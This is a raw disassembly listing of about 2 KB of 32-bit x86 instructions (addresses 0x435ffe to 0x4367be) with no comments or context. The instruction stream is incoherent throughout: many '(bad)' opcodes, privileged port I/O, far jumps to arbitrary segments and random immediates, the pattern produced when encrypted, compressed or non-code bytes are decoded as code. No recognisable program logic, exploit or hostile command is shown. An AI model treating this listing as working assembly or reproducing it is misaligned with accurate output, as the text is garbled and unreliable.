  435ffe:	mov    WORD PTR [ebp-0x169f0cbf],?
  436004:	ds scas eax,DWORD PTR es:[edi]
  436006:	adc    eax,0x104c057a
  43600b:	ins    BYTE PTR es:[edi],dx
  43600c:	push   ds
  43600d:	js     0x43607b
  43600f:	mov    ebx,0xd9df988b
  436014:	test   edx,eax
  436016:	aaa    
  436017:	mov    ebx,0x61b81f88
  43601c:	mov    ah,0xce
  43601e:	lahf   
  43601f:	xor    bl,BYTE PTR [esi]
  436021:	add    ah,BYTE PTR [esi+eax*4-0x20]
  436025:	add    DWORD PTR [edi],ecx
  436027:	ins    DWORD PTR es:[edi],dx
  436028:	arpl   WORD PTR [eax-0x4bc5d4a0],cx
  43602e:	ins    DWORD PTR es:[edi],dx
  43602f:	enter  0x25d8,0x9c
  436033:	mov    edx,0x70beb0c2
  436038:	or     ch,ch
  43603a:	cmp    edi,DWORD PTR [edi+0x23]
  43603d:	xchg   esp,eax
  43603e:	pusha  
  43603f:	mov    ebp,0x77359b24
  436044:	mov    ecx,0xc6592f91
  436049:	mov    al,ds:0x2ce7ad61
  43604e:	jecxz  0x43607e
  436050:	das    
  436051:	retf   0xd622
  436054:	mov    DWORD PTR [ebx],ebp
  436056:	outs   dx,BYTE PTR ds:[esi]
  436058:	dec    BYTE PTR [edx]
  43605a:	ds retf 0x225
  43605e:	mov    al,0x99
  436060:	xchg   DWORD PTR ds:0xd95643e3,edi
  436066:	nop
  436067:	jge    0x43609c
  436069:	add    dh,ah
  43606b:	add    eax,0x1205414b
  436070:	adc    eax,0x39fcd203
  436075:	or     ebp,ebp
  436077:	pop    edx
  436078:	dec    edx
  436079:	adc    al,0x1f
  43607b:	mov    ebx,0xa964e0d5
  436080:	mov    esp,0x1bd40307
  436085:	and    ah,BYTE PTR [ecx+0x23]
  436088:	fcomip st,st(4)
  43608a:	rcr    DWORD PTR [ebp+0x69],0x67
  43608e:	ins    DWORD PTR es:[edi],dx
  43608f:	jge    0x436040
  436091:	mov    eax,0x3608961b
  436096:	lods   al,BYTE PTR ds:[esi]
  436097:	or     dh,bl
  436099:	add    eax,0x7a7cb182
  43609e:	loop   0x436049
  4360a0:	arpl   WORD PTR [eax-0x51],di
  4360a3:	lds    esp,FWORD PTR [edi+0x2185433e]
  4360a9:	xchg   ecx,eax
  4360aa:	pop    ds
  4360ab:	adc    esi,eax
  4360ad:	cli    
  4360ae:	repnz push ss
  4360b0:	popf   
  4360b1:	mov    bh,BYTE PTR [ecx-0x16]
  4360b4:	mov    DWORD PTR [edx+0x1301eb1a],ebp
  4360ba:	and    al,0xe
  4360bc:	mov    BYTE PTR [ebx+0x51],bl
  4360bf:	xchg   edi,eax
  4360c0:	loop   0x436043
  4360c2:	addr16 sub al,ah
  4360c5:	loop   0x43604f
  4360c7:	aad    0x9a
  4360c9:	sub    DWORD PTR [esp+ebx*4],ecx
  4360cc:	in     al,dx
  4360cd:	add    BYTE PTR [ebx+0x75],ah
  4360d0:	mov    DWORD PTR [ebx-0x20b42c08],ebp
  4360d6:	iret   
  4360d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4360d8:	push   ds
  4360d9:	inc    esp
  4360da:	es imul esi,esi,0xd5037b02
  4360e1:	in     al,0xed
  4360e3:	sub    DWORD PTR [ecx-0x6a1f919],ecx
  4360e9:	enter  0xcfaa,0x72
  4360ed:	sbb    al,0xa6
  4360ef:	je     0x4360b5
  4360f1:	push   esp
  4360f2:	inc    esp
  4360f3:	push   esi
  4360f4:	cdq    
  4360f5:	les    ecx,FWORD PTR [edx]
  4360f7:	mov    edi,0xd70d91f9
  4360fc:	push   esp
  4360fd:	or     al,0x59
  4360ff:	and    al,0x22
  436101:	dec    edi
  436102:	pop    edx
  436103:	aam    0xba
  436105:	aas    
  436106:	cli    
  436107:	mov    eax,ds:0x704b234c
  43610c:	mov    ecx,ebx
  43610e:	push   ds
  43610f:	xchg   esi,eax
  436110:	cmp    BYTE PTR [edi-0x24],0x64
  436114:	and    ebp,DWORD PTR [ecx]
  436116:	aaa    
  436117:	ja     0x436179
  436119:	daa    
  43611a:	hlt    
  43611b:	mov    DWORD PTR [edx-0x31],0x7c7490a0
  436122:	inc    ebp
  436123:	hlt    
  436124:	pusha  
  436125:	stc    
  436126:	data16 (bad) 
  436128:	ret    
  436129:	(bad)  
  43612a:	jg     0x4360c2
  43612c:	pop    ds
  43612d:	add    eax,DWORD PTR [ecx-0x74]
  436130:	add    edi,DWORD PTR ss:[eax-0x3db0e241]
  436137:	push   es
  436138:	(bad)  
  436139:	jge    0x436159
  43613b:	popf   
  43613c:	lds    ebx,FWORD PTR [eax+0x24]
  43613f:	shl    BYTE PTR [edx+0x54],1
  436142:	std    
  436143:	aam    0xc1
  436145:	jnp    0x43614c
  436147:	out    dx,al
  436148:	rcr    esi,1
  43614a:	lea    esi,[ebx-0x77]
  43614d:	leave  
  43614e:	jle    0x436179
  436150:	(bad)  
  436151:	popf   
  436152:	pop    esp
  436153:	xchg   ebp,eax
  436154:	mov    esp,0x4be1ffe2
  436159:	daa    
  43615a:	mov    esi,0x9bc4cf6e
  43615f:	push   ebp
  436160:	out    dx,al
  436161:	mov    edx,DWORD PTR ds:0x7ba50352
  436167:	inc    ebx
  436168:	ins    DWORD PTR es:[edi],dx
  436169:	inc    esi
  43616a:	adc    edx,0xffffffbe
  43616d:	pop    ebp
  43616e:	add    al,0xf4
  436170:	xchg   esi,eax
  436171:	xchg   edx,eax
  436172:	imul   edx,esp,0x52bee9ed
  436178:	dec    eax
  436179:	ror    eax,1
  43617b:	in     al,0x62
  43617d:	sub    al,0x1e
  43617f:	cmp    DWORD PTR [edx-0xcadcebd],0xdecec196
  436189:	jmp    0xf01435a0
  43618e:	loop   0x436149
  436190:	push   ecx
  436191:	jge    0x43613f
  436193:	stos   DWORD PTR es:[edi],eax
  436194:	(bad)  
  436195:	in     eax,dx
  436196:	jne    0x436162
  436198:	sar    DWORD PTR [esi],0xda
  43619b:	test   BYTE PTR [edx+edx*4+0x2a],ah
  43619f:	lahf   
  4361a0:	and    al,0x83
  4361a2:	and    edx,edi
  4361a4:	pop    eax
  4361a5:	sub    DWORD PTR [esi+0x658669d1],edi
  4361ab:	adc    esp,eax
  4361ad:	push   edx
  4361ae:	mov    eax,DWORD PTR [ebp-0x13cb5ddf]
  4361b4:	cmp    al,0x2
  4361b6:	outs   dx,BYTE PTR ds:[esi]
  4361b7:	repnz xor cl,bl
  4361ba:	jne    0x43616f
  4361bc:	mov    esi,0x12ff1e15
  4361c1:	es (bad) 
  4361c3:	xchg   edx,eax
  4361c4:	adc    BYTE PTR [esp+esi*8-0x46],bh
  4361c8:	aad    0xde
  4361ca:	ds (bad) 
  4361cd:	xchg   edx,eax
  4361ce:	enter  0xbe31,0x82
  4361d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4361d3:	pop    eax
  4361d4:	jb     0x436187
  4361d6:	jle    0x43615f
  4361d8:	xchg   ecx,eax
  4361d9:	(bad)  
  4361da:	int    0xd4
  4361dc:	inc    edi
  4361dd:	or     bl,bh
  4361df:	mov    eax,ds:0x84ba0593
  4361e4:	cwde   
  4361e5:	mov    edx,ebp
  4361e7:	xor    al,0x9e
  4361e9:	ja     0x436209
  4361eb:	xlat   BYTE PTR ds:[ebx]
  4361ec:	or     dl,al
  4361ee:	pop    eax
  4361ef:	fidiv  DWORD PTR [edx+ecx*8+0x35bdd2fb]
  4361f6:	shl    DWORD PTR [edi+ebp*8+0x1809f53],0xa2
  4361fe:	pop    ds
  4361ff:	lea    edx,[ebx]
  436201:	xchg   edx,eax
  436202:	mov    dl,0x9d
  436204:	pushf  
  436205:	jns    0x4361ac
  436207:	aam    0x39
  436209:	push   edi
  43620a:	push   ebx
  43620b:	test   eax,0xb0394194
  436210:	mov    BYTE PTR ds:0x8504f727,ah
  436216:	ret    
  436217:	aas    
  436218:	pop    edi
  436219:	add    ebx,DWORD PTR [eax]
  43621b:	inc    eax
  43621c:	out    dx,al
  43621d:	sub    dl,bh
  43621f:	jne    0x436222
  436221:	fistp  QWORD PTR [ebx]
  436223:	jmp    0x6a746fb0
  436228:	add    al,0xf3
  43622a:	cdq    
  43622b:	aaa    
  43622c:	mov    WORD PTR [ebx],es
  43622e:	mov    WORD PTR [ebx],?
  436230:	loop   0x4361b8
  436232:	pop    eax
  436233:	(bad)  
  436234:	aas    
  436235:	call   0xc779:0x4b898618
  43623c:	ins    DWORD PTR es:[edi],dx
  43623d:	and    al,0xc8
  43623f:	push   ds
  436240:	push   cs
  436241:	add    ah,BYTE PTR [edx-0x65c21faf]
  436247:	jmp    0xf439:0x317c664e
  43624e:	sbb    BYTE PTR [edi],dl
  436250:	xchg   esp,eax
  436251:	mov    ebx,?
  436253:	test   DWORD PTR [eax+0x3],ebx
  436256:	outs   dx,BYTE PTR ds:[esi]
  436257:	addr16 mov edi,0x1d5f963a
  43625d:	addr16 pop ds
  43625f:	shl    DWORD PTR [ecx+0x2e],0xa5
  436263:	shl    BYTE PTR [ebp+edi*8+0x58],cl
  436267:	popf   
  436268:	loopne 0x4362e1
  43626a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43626b:	aad    0x64
  43626d:	gs push 0x47
  436270:	pusha  
  436271:	xchg   DWORD PTR [edi],ebx
  436273:	add    edi,DWORD PTR [eax+0x35]
  436276:	xchg   ebx,eax
  436277:	xor    al,0xae
  436279:	imul   ebx,DWORD PTR [ecx+edx*8+0x4],0xfffffff1
  43627e:	jg     0x43629c
  436280:	das    
  436281:	sbb    DWORD PTR [edi+0x7b147c4a],0x2f
  436288:	or     ebx,esp
  43628a:	pop    ecx
  43628b:	push   ds
  43628c:	xchg   esi,eax
  43628d:	mov    eax,0xe42b57ea
  436292:	pop    edx
  436293:	out    0x60,eax
  436295:	add    DWORD PTR [esi-0x2b],esp
  436298:	loop   0x436260
  43629a:	fcom   DWORD PTR [ebx]
  43629c:	pushf  
  43629d:	mov    ebp,DWORD PTR [eax]
  43629f:	dec    eax
  4362a0:	mov    DWORD PTR [ebp+0x444d85fa],eax
  4362a6:	test   BYTE PTR [edx],cl
  4362a8:	sub    BYTE PTR [ebx],al
  4362aa:	stos   BYTE PTR es:[edi],al
  4362ab:	or     DWORD PTR [eax],esp
  4362ad:	and    BYTE PTR [ecx],bh
  4362af:	jmp    0x8da4565b
  4362b4:	aad    0x4f
  4362b6:	shr    ch,0x31
  4362b9:	outs   dx,DWORD PTR ds:[esi]
  4362ba:	ins    DWORD PTR es:[edi],dx
  4362bb:	pop    ebx
  4362bc:	popf   
  4362bd:	or     ebx,DWORD PTR [edi]
  4362bf:	cli    
  4362c0:	(bad)  
  4362c1:	js     0x43624f
  4362c3:	aas    
  4362c4:	jg     0x436326
  4362c6:	inc    ebx
  4362c7:	adc    eax,0x1d609909
  4362cc:	jno    0x436324
  4362ce:	pop    eax
  4362cf:	push   eax
  4362d0:	cmp    al,0x2d
  4362d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4362d3:	push   0xda1f2be9
  4362d8:	jns    0x43628a
  4362da:	ret    
  4362db:	mov    ds:0x90e77f89,al
  4362e0:	call   0x8002:0xa050c8a7
  4362e7:	add    DWORD PTR [ebx-0x45],ebx
  4362ea:	dec    edi
  4362eb:	jmp    0x7ba37e76
  4362f0:	and    al,0x9
  4362f2:	xchg   esp,eax
  4362f3:	xchg   DWORD PTR [ebx],ebx
  4362f5:	mov    eax,ds:0xab3f66ff
  4362fa:	jmp    0x4362ce
  4362fc:	mov    DWORD PTR ds:0x6ac6d8d6,esp
  436302:	and    eax,0xc995970a
  436307:	jbe    0x4362ee
  436309:	(bad)  
  43630a:	loopne 0x436304
  43630c:	sbb    cl,BYTE PTR [esi+0x5d]
  43630f:	mov    BYTE PTR [esi],dh
  436311:	add    edi,DWORD PTR [eax-0x6e]
  436314:	jge    0x436313
  436316:	cmp    cl,al
  436318:	aas    
  436319:	push   ebx
  43631a:	pop    ds
  43631b:	push   edi
  43631c:	(bad)  
  43631d:	push   ss
  43631e:	div    BYTE PTR [eax-0x55a8bf18]
  436324:	pop    ecx
  436325:	iret   
  436326:	jg     0x4362ef
  436328:	or     BYTE PTR [ebx],ah
  43632a:	test   BYTE PTR [edi+esi*1-0x74a69ff4],ch
  436331:	(bad)  
  436332:	push   es
  436333:	cmp    BYTE PTR [edx+ecx*1-0x100028c1],0x7a
  43633b:	out    0xcb,al
  43633d:	cwde   
  43633e:	xchg   esi,eax
  43633f:	dec    eax
  436340:	cmp    BYTE PTR [eax-0xbbe28df],ah
  436346:	or     bh,BYTE PTR [edx-0x4a]
  436349:	mov    ah,0xe8
  43634b:	rcl    BYTE PTR [edi+0x1597ad97],cl
  436351:	lock cmp bh,dl
  436354:	add    bh,BYTE PTR [esi+0x3d89a3b0]
  43635a:	mov    edx,0xb62687e0
  43635f:	dec    esp
  436360:	arpl   WORD PTR [edi-0x1e],dx
  436363:	dec    ecx
  436364:	lar    esi,WORD PTR [esi-0x3a]
  436368:	(bad)  [edi+eiz*4+0x225989cc]
  43636f:	pop    ss
  436370:	jp     0x43639d
  436372:	shl    BYTE PTR [ebx],0x4f
  436375:	add    edi,DWORD PTR [ebx+edx*8-0x4b7db7e2]
  43637c:	aaa    
  43637d:	jnp    0x43639e
  43637f:	test   eax,0x9d94109b
  436384:	inc    ecx
  436385:	test   edx,0x60919f5e
  43638b:	sub    cl,dh
  43638d:	or     al,0xa7
  43638f:	xchg   ecx,eax
  436390:	jbe    0x436394
  436392:	pop    ds
  436393:	push   edi
  436394:	pop    eax
  436395:	mov    eax,ds:0x91e4b818
  43639a:	jg     0x436371
  43639c:	and    ebx,DWORD PTR [edi+0x1]
  43639f:	jbe    0x436344
  4363a1:	into   
  4363a2:	adc    al,0xa5
  4363a4:	mov    ecx,esp
  4363a6:	xchg   ecx,eax
  4363a7:	inc    ecx
  4363a8:	mov    eax,0x9d983038
  4363ad:	add    dh,BYTE PTR [esi+0x6d]
  4363b0:	test   DWORD PTR [edx],ebx
  4363b2:	cli    
  4363b3:	push   0x801cd347
  4363b8:	mov    esi,DWORD PTR [ecx-0x4c8ea572]
  4363be:	inc    esi
  4363bf:	ret    0x430f
  4363c2:	dec    edi
  4363c3:	mov    ebx,0x36540269
  4363c8:	ins    BYTE PTR es:[edi],dx
  4363c9:	mov    ebx,0x6a80b93a
  4363ce:	pop    ds
  4363cf:	lds    esi,FWORD PTR [edx-0x252c4f88]
  4363d5:	dec    edx
  4363d6:	(bad)  
  4363d7:	mov    bl,0xc8
  4363d9:	pop    esi
  4363da:	sub    DWORD PTR [edx+0x14c8054d],ebp
  4363e0:	test   BYTE PTR [edi+0x7d8791a9],cl
  4363e6:	(bad)  
  4363e7:	mov    edi,0x5da09205
  4363ec:	pop    eax
  4363ed:	xor    cl,BYTE PTR [esi]
  4363ef:	mov    ch,0x21
  4363f1:	jne    0x43640c
  4363f3:	pop    edx
  4363f4:	or     ch,dh
  4363f6:	cld    
  4363f7:	shl    BYTE PTR [ecx],1
  4363f9:	bound  edi,QWORD PTR [edx-0x4d]
  4363fc:	aas    
  4363fd:	outs   dx,DWORD PTR ds:[esi]
  4363fe:	lods   al,BYTE PTR ds:[esi]
  4363ff:	push   esp
  436400:	or     BYTE PTR [ebx+ebx*8+0x4820ab9],dl
  436407:	sbb    edx,DWORD PTR [edi+0x38]
  43640a:	sub    eax,DWORD PTR [edi+0x7844b788]
  436410:	push   esp
  436411:	movaps XMMWORD PTR [eax],xmm6
  436414:	pop    esi
  436415:	add    ebp,DWORD PTR [edx]
  436417:	push   ss
  436418:	inc    ecx
  436419:	cmp    edx,DWORD PTR [esi]
  43641b:	in     eax,0xdc
  43641d:	push   esp
  43641e:	mov    dh,0xf7
  436420:	in     al,0x79
  436422:	pop    esi
  436423:	inc    ecx
  436424:	call   0xb505:0xd22e5c29
  43642b:	xchg   ecx,eax
  43642c:	sub    BYTE PTR [esi+0x10b9d5f5],dl
  436432:	dec    edi
  436433:	shl    DWORD PTR [edi+eax*2],1
  436436:	xor    BYTE PTR [edi],dh
  436438:	mov    bh,ah
  43643a:	xor    edx,DWORD PTR [ecx+0x8]
  43643d:	dec    esp
  43643e:	or     bl,BYTE PTR [esi]
  436440:	adc    eax,0x4b06b602
  436445:	and    eax,0x916725ca
  43644a:	jge    0x43648b
  43644c:	inc    edx
  43644d:	dec    edx
  43644e:	out    0x7b,al
  436450:	hlt    
  436451:	add    eax,0x6d5ea974
  436456:	(bad)  
  436457:	xlat   BYTE PTR ds:[ebx]
  436458:	adc    BYTE PTR [ebp+0x1d],ah
  43645b:	mov    dl,0x3a
  43645d:	and    edi,ecx
  43645f:	hlt    
  436460:	(bad)  
  436461:	and    ebx,DWORD PTR [esi]
  436463:	sbb    DWORD PTR [eax],0xecdefca4
  436469:	cmp    dl,BYTE PTR [eax+0x29d91ad5]
  43646f:	pop    ebp
  436470:	cmp    al,0x6f
  436472:	push   edx
  436473:	outs   dx,BYTE PTR ds:[esi]
  436474:	mov    DWORD PTR [ebx+0x13e6990d],ebp
  43647a:	add    eax,0x8605e08e
  43647f:	push   esi
  436480:	mov    ch,0x37
  436482:	int3   
  436483:	or     BYTE PTR [edi],bl
  436485:	(bad)  
  436486:	pusha  
  436487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436488:	cmp    al,0xcb
  43648a:	push   ecx
  43648b:	ins    DWORD PTR es:[edi],dx
  43648c:	jmp    0x6a8e:0xcad7133c
  436493:	das    
  436494:	dec    esi
  436495:	jns    0x43647c
  436497:	cli    
  436498:	mov    edi,DWORD PTR [ebp-0x63]
  43649b:	mov    eax,ds:0x7b730b3e
  4364a0:	sub    BYTE PTR [ebp+0x26],ch
  4364a3:	xlat   BYTE PTR ds:[ebx]
  4364a4:	dec    eax
  4364a5:	cmp    BYTE PTR [ebp+0x32],al
  4364a8:	lods   al,BYTE PTR ds:[esi]
  4364a9:	(bad)  
  4364aa:	ret    
  4364ab:	ins    DWORD PTR es:[edi],dx
  4364ac:	call   FWORD PTR [ecx]
  4364ae:	add    BYTE PTR [eax-0x52999513],dh
  4364b4:	hlt    
  4364b5:	or     edx,esp
  4364b7:	test   al,0x33
  4364b9:	jge    0x4364d1
  4364bb:	test   DWORD PTR [ecx-0x1b640ffb],edx
  4364c1:	push   ds
  4364c2:	and    bl,BYTE PTR [ecx+0x53]
  4364c5:	repnz cdq 
  4364c7:	mov    DWORD PTR [edi+0x2],eax
  4364ca:	push   ss
  4364cb:	lods   eax,DWORD PTR ds:[esi]
  4364cc:	int    0xbd
  4364ce:	mov    bl,0x33
  4364d0:	call   0xa0c3:0x35fd5026
  4364d7:	inc    esi
  4364d8:	jp     0x4364e6
  4364da:	neg    BYTE PTR [eax-0x78]
  4364dd:	shl    DWORD PTR [edx-0x56583715],0x3c
  4364e4:	mov    DWORD PTR ds:0xf5a2e676,0xe3126557
  4364ee:	pop    ds
  4364ef:	test   eax,0x758b56b3
  4364f4:	jb     0x436557
  4364f6:	inc    ecx
  4364f7:	aam    0xcc
  4364f9:	neg    BYTE PTR [ebp+0x58]
  4364fc:	stos   DWORD PTR es:[edi],eax
  4364fd:	pop    ss
  4364fe:	add    esi,DWORD PTR [ebx-0x65]
  436501:	loope  0x4364ac
  436503:	adc    ecx,edi
  436505:	add    ah,ch
  436507:	sbb    eax,DWORD PTR [eax]
  436509:	xchg   ebp,eax
  43650a:	xchg   ebx,eax
  43650b:	aam    0xb2
  43650d:	jle    0x4364c2
  43650f:	jne    0x436550
  436511:	mov    bh,0x1c
  436513:	add    ch,0x11
  436516:	cmp    BYTE PTR [ebx-0x9],dh
  436519:	dec    ebx
  43651a:	leave  
  43651b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43651c:	js     0x436521
  43651e:	or     al,0xd1
  436520:	pop    esi
  436521:	(bad)
  436525:	add    dl,BYTE PTR [esi-0xf]
  436528:	inc    ecx
  436529:	loopne 0x43659b
  43652b:	retf   0x1e63
  43652e:	push   ds
  43652f:	jno    0x43658b
  436531:	pop    esi
  436532:	xchg   ebx,eax
  436533:	dec    ebx
  436534:	dec    esp
  436535:	outs   dx,DWORD PTR ds:[esi]
  436536:	sub    ah,dl
  436538:	gs ins BYTE PTR es:[edi],dx
  43653a:	push   edx
  43653b:	mov    bh,0xac
  43653d:	scas   eax,DWORD PTR es:[edi]
  43653e:	(bad)  
  43653f:	mov    dl,0xb8
  436541:	fisub  DWORD PTR [eax-0x1f]
  436544:	div    BYTE PTR [edx+0x54]
  436547:	add    eax,0x9a7d0dc2
  43654c:	or     dl,bh
  43654e:	or     edx,edi
  436550:	ret    
  436551:	xchg   esi,eax
  436552:	jne    0x436517
  436554:	push   esi
  436555:	sahf   
  436556:	pusha  
  436557:	sub    DWORD PTR ds:0x608540c3,ebx
  43655d:	mov    ebp,0x367dafdd
  436562:	test   DWORD PTR ds:0xfad70312,0xe3633523
  43656c:	sub    eax,0x3b918a14
  436571:	ret    0xfb13
  436574:	fild   DWORD PTR [edx]
  436576:	pop    eax
  436577:	add    BYTE PTR [edi+0x5fabb522],dh
  43657d:	cmp    dl,BYTE PTR [ebp+0x1ff0586b]
  436583:	jg     0x436579
  436585:	push   ebx
  436586:	pushf  
  436587:	inc    ebp
  436588:	xchg   esp,eax
  436589:	mov    ebp,DWORD PTR [esi]
  43658b:	xlat   BYTE PTR ds:[ebx]
  43658c:	daa    
  43658d:	cmc    
  43658e:	aaa    
  43658f:	mov    al,ds:0x758ed385
  436594:	push   eax
  436595:	jg     0x4365fc
  436597:	jg     0x436608
  436599:	pusha  
  43659a:	lock ins BYTE PTR es:[edi],dx
  43659c:	ins    DWORD PTR es:[edi],dx
  43659d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43659e:	add    dl,ah
  4365a0:	or     al,0xaf
  4365a2:	ins    DWORD PTR es:[edi],dx
  4365a3:	aam    0x3d
  4365a5:	std    
  4365a6:	je     0x4365af
  4365a8:	inc    ebx
  4365a9:	push   ebx
  4365aa:	sbb    eax,0x15bd88c4
  4365af:	lea    edi,[ebp+0x18a642d9]
  4365b5:	dec    ebx
  4365b6:	fdiv   QWORD PTR [esi+0x4a]
  4365b9:	push   edi
  4365ba:	cmp    dh,dl
  4365bc:	lock dec ebp
  4365be:	mov    ecx,0xd303ef30
  4365c3:	lods   al,BYTE PTR ds:[esi]
  4365c4:	mov    ebx,0x5ea46da3
  4365c9:	inc    ebx
  4365ca:	mov    bl,0xbb
  4365cc:	stc    
  4365cd:	add    dl,ah
  4365cf:	inc    esi
  4365d0:	test   eax,0xfc591d28
  4365d5:	sub    ebp,DWORD PTR [edx-0x65b8615f]
  4365db:	aad    0x40
  4365dd:	sbb    edx,esi
  4365df:	xchg   ebp,eax
  4365e0:	or     BYTE PTR ds:[ebx-0x2c],0x7e
  4365e5:	sti    
  4365e6:	dec    ebp
  4365e7:	jbe    0x436578
  4365e9:	and    cl,cl
  4365eb:	lods   al,BYTE PTR ds:[esi]
  4365ec:	mov    cl,dh
  4365ee:	inc    ebp
  4365ef:	add    ebx,DWORD PTR [edi+0x2e]
  4365f2:	mov    ds:0xcc05ea7e,eax
  4365f7:	dec    esp
  4365f8:	xor    esp,DWORD PTR [ebx+0x29]
  4365fb:	sub    eax,0x551e5bb7
  436600:	xchg   ebp,eax
  436601:	repnz sub BYTE PTR [ebp-0x50a71a82],ch
  436608:	pop    eax
  436609:	aaa    
  43660a:	sub    al,0xb2
  43660c:	stc    
  43660d:	add    eax,0x6abf61e7
  436612:	fwait
  436613:	daa    
  436614:	jmp    0xbc00:0x50702429
  43661b:	dec    eax
  43661c:	enter  0x9f31,0xed
  436620:	in     eax,0xff
  436622:	jge    0x436682
  436624:	sahf   
  436625:	cmp    ebx,DWORD PTR [esi]
  436627:	inc    eax
  436628:	xor    eax,DWORD PTR [esi+0x7b]
  43662b:	(bad)  
  43662c:	stos   DWORD PTR es:[edi],eax
  43662d:	jae    0x43664d
  43662f:	and    esi,DWORD PTR [eax]
  436631:	add    ch,BYTE PTR [ebx-0x44]
  436634:	cmp    al,0x2f
  436636:	mov    eax,ds:0x8bd1ae9f
  43663b:	aad    0x22
  43663d:	call   0xd6f92ff9
  436642:	and    BYTE PTR [edx+0x662c6ff8],ch
  436648:	jo     0x43666f
  43664a:	inc    edx
  43664b:	sar    esp,0x35
  43664e:	pop    esi
  43664f:	xor    al,ch
  436651:	sbb    eax,0x8188f6cc
  436656:	adc    DWORD PTR [ecx+0xb370bdc],0xc16a0248
  436660:	pushf  
  436661:	and    eax,0x9d0f9d50
  436666:	pop    ebp
  436667:	xchg   edi,eax
  436668:	sar    DWORD PTR [eax],cl
  43666a:	lahf   
  43666b:	leave  
  43666c:	mov    BYTE PTR [edx-0x62],al
  43666f:	sar    eax,1
  436671:	jb     0x436612
  436673:	aam    0x57
  436675:	mov    esp,0xdd6263d5
  43667a:	les    ebp,FWORD PTR [eax-0x71]
  43667d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43667e:	inc    ebx
  43667f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436680:	dec    esp
  436681:	pop    ebx
  436682:	or     BYTE PTR [esp+edx*8-0x70],dh
  436686:	mov    dh,0xc4
  436688:	push   ds
  436689:	inc    ebp
  43668a:	mov    dl,0xb7
  43668c:	popf   
  43668d:	test   DWORD PTR [esi],edi
  43668f:	inc    esp
  436690:	lea    edx,[esi+eax*2+0x1]
  436694:	mov    cl,0x21
  436696:	in     al,0xfc
  436698:	or     ecx,ebx
  43669a:	sbb    DWORD PTR [edx-0x2b0a118c],ebp
  4366a0:	or     BYTE PTR [edi*8+0x5acb7786],bh
  4366a7:	mov    DWORD PTR es:[ebx+0x75],esi
  4366ab:	fsubr  QWORD PTR [ecx]
  4366ad:	test   DWORD PTR [eax+0x32],ecx
  4366b0:	nop
  4366b1:	test   bl,al
  4366b3:	inc    ebp
  4366b4:	mov    BYTE PTR [eax+0x6a],ah
  4366b7:	data16 daa 
  4366b9:	loopne 0x4366f4
  4366bb:	push   ebx
  4366bc:	mov    BYTE PTR [ebx],dl
  4366be:	and    bh,BYTE PTR [eax+0x38]
  4366c1:	mov    esp,0x2ddcae27
  4366c6:	es add edi,edi
  4366c9:	cmp    eax,0x81893092
  4366ce:	pop    edx
  4366cf:	sub    eax,0xc604cf95
  4366d4:	les    eax,FWORD PTR [esi]
  4366d6:	adc    ah,dl
  4366d8:	pop    edx
  4366d9:	sbb    ch,bl
  4366db:	pop    ecx
  4366dc:	sbb    DWORD PTR [ebx-0x326b1ea4],ebx
  4366e2:	mov    es,WORD PTR [edx-0x23]
  4366e5:	or     DWORD PTR [edi],ebx
  4366e7:	pop    ebx
  4366e8:	ins    BYTE PTR es:[edi],dx
  4366e9:	daa    
  4366ea:	inc    esp
  4366eb:	mov    ?,WORD PTR [edi-0x76e83436]
  4366f1:	jecxz  0x436728
  4366f3:	xor    eax,0xa99c0da
  4366f8:	add    BYTE PTR [edi+0x122dd825],0x1e
  4366ff:	cs daa 
  436701:	and    BYTE PTR [edi],ch
  436703:	ret    
  436704:	enter  0xb801,0x7c
  436708:	sti    
  436709:	outs   dx,BYTE PTR ds:[esi]
  43670a:	add    eax,0xb87c0925
  43670f:	aaa    
  436710:	je     0x4366da
  436712:	cwde   
  436713:	lods   eax,DWORD PTR ds:[esi]
  436714:	sbb    al,0x3
  436716:	mov    eax,ds:0x3c4ab522
  43671b:	add    esi,esi
  43671d:	add    BYTE PTR [edx+0x7d],dl
  436720:	pop    esp
  436721:	loopne 0x4366ab
  436723:	je     0x4366e6
  436725:	lods   eax,DWORD PTR ds:[esi]
  436726:	ss js  0x4367a2
  436729:	mov    ebx,0x4b2f531f
  43672e:	and    dl,bl
  436730:	xchg   edx,eax
  436731:	jmp    0xedca:0x5c2c172
  436738:	xlat   BYTE PTR ds:[ebx]
  436739:	iret   
  43673a:	sti    
  43673b:	int    0x4e
  43673d:	out    0x1f,eax
  43673f:	xchg   DWORD PTR [eax],esi
  436741:	in     eax,0x28
  436743:	pop    eax
  436744:	mov    edx,0x5dd58be8
  436749:	mov    ecx,0xcd7e658f
  43674e:	test   eax,0x517d8851
  436753:	pop    es
  436754:	jbe    0x436736
  436756:	sahf   
  436757:	pushf  
  436758:	in     eax,dx
  436759:	dec    ebx
  43675a:	mov    al,ds:0xe005f1f2
  43675f:	sbb    dh,BYTE PTR [edi-0x57ff8a1]
  436765:	jecxz  0x436728
  436767:	(bad)  
  436768:	aas    
  436769:	adc    BYTE PTR [eax],bl
  43676b:	push   esp
  43676c:	fisub  WORD PTR [eax]
  43676f:	jmp    DWORD PTR es:[esi+esi*2]
  436773:	das    
  436774:	cmp    al,0x93
  436776:	and    BYTE PTR [edi+0x19b505c6],dh
  43677c:	stc    
  43677d:	ds push ds
  43677f:	jecxz  0x436744
  436781:	sbb    DWORD PTR [esi+ebx*2-0x64],ebx
  436785:	dec    ebp
  436786:	call   0x32a4195f
  43678b:	xchg   esp,eax
  43678c:	xor    edi,edi
  43678e:	push   edx
  43678f:	xor    BYTE PTR [eax+0x747a9c2f],cl
  436795:	sub    al,0xbf
  436797:	jmp    0x4a456d45
  43679c:	adc    eax,0xc48baf5f
  4367a1:	xchg   esp,eax
  4367a2:	nop    DWORD PTR [eax+0x2f75251]
  4367a9:	(bad)  
  4367aa:	mov    ss,esp
  4367ac:	jecxz  0x43680f
  4367ae:	jge    0x4367f7
  4367b0:	xor    dh,BYTE PTR [ebp+ebx*4+0x66b1883d]
  4367b7:	and    bl,BYTE PTR [eax]
  4367b9:	repnz pop edi
  4367bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4367bc:	add    edi,edi
  4367be:	out    0xc5,al
